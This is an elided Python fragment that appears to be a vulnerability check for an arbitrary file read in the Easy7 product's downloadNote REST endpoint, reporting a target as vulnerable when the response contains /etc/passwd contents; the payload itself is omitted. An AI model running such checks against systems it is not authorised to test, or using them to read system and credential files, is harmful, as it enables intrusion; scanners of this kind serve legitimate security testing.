...
def check(target):
    ...
    url = '/Easy7/rest/file/downloadNote'
    ...
    try:
        ...
        if resp.status_code == 200 and 'root:x:0:0:root' in resp.text:
            print(f"{target} 存在漏洞")
...
if __name__ == "__main__":
    parser = argparse.ArgumentParser("Check easy7 downloadNote file read")
